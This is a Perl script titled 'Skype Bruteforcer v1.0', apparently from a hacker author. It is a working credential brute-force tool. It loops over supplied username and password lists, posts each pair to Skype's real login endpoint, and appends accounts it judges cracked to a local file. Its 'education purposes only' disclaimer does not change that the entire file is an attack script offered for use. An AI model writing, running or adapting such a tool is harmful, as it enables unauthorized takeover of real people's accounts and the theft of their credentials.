#!perl
#----------------------------------------------------------------------------------------------|
#With this program you can bruteforce skype accounts                     	                   |
#Authors: Alexander Rachev (a.k.a matrix_killer)											   |
#Contact: matrix_k _at_ abv.bg																   |
#Version: 1.0													                               | 
#Copyright: this program is under a Creative Commons Attribution 2.5 Bulgaria License.	       |
#Greets: Bl0od3r, Acid_BDS, Alpha-fan and all other friends[they know who they are ;)]         |
#				                    !WARNING!										           |
# THIS PROGRAM IS MADE FOR EDUCATION PURPOSES ONLY ! I'M NOT RESPONSIBLE FOR YOUR ACTIONS !!!  |
#----------------------------------------------------------------------------------------------|

#http://search.cpan.org/~dland/Crypt-SSLeay-0.54/SSLeay.pm IS REQUIRED !!!!
 
 use Getopt::Std;
 use HTTP::Request::Common qw(POST);
 use LWP::UserAgent;

$SIG{'INT'} = \&sig_catch;$SIG{'HUP'}='IGNORE';$SIG{'TERM'}='IGNORE';
$SIG{'CHLD'}='IGNORE';$SIG{'ALRM'}='IGNORE';

  $| = 1; 

  sub sig_catch {
  exit;
  }

  getopts('u:p:');
  our($opt_u,$opt_p);

  my $userlist = $opt_u;
  my $passlist = $opt_p;

	if ($userlist eq "") {
	print "\n";
	print "***************************************************************************\n";
	print "Skype Bruteforcer v1.0													    \n";
	print "By Alexander Rachev(a.k.a matrix_killer)									    \n";
	print "usage: perl $0 -u <users> -p <passwords>										\n";
	print "***************************************************************************\n";
	exit (1);
	}

	open(USERS, "<$userlist") || die ("Cannot open username file");
	open(WORDS, "<$passlist") || die ("Cannot open password file");
	@users= <USERS>;
	@words= <WORDS>;
	close(USERS);
	close(WORDS);
	$i=0;
 
 foreach $user (@users) {
 chomp($user);
 foreach $pass (@words) {
 chomp($pass);
 $ua = LWP::UserAgent->new;
 printf("\n%5d Trying $user:$pass", ++$i);
 my $req = POST 'https://secure.skype.com/store/member/dologin.html',
                [ username => $user, password => $pass, login => 'Sign+me+in' ];

  my $res = $ua->request($req);
  
  if ($res->as_string =~ /cookiecheck/gi) {
  open (LOG, ">>bruted_skype_accounts.txt");
  $time = time();
  $loctime = localtime($time);
  print LOG "\n";
  print LOG "Time: $loctime\n";
  print LOG "username: $user\n";
  print LOG "passowrd: $pass\n\n";
  close(LOG);
  }}}

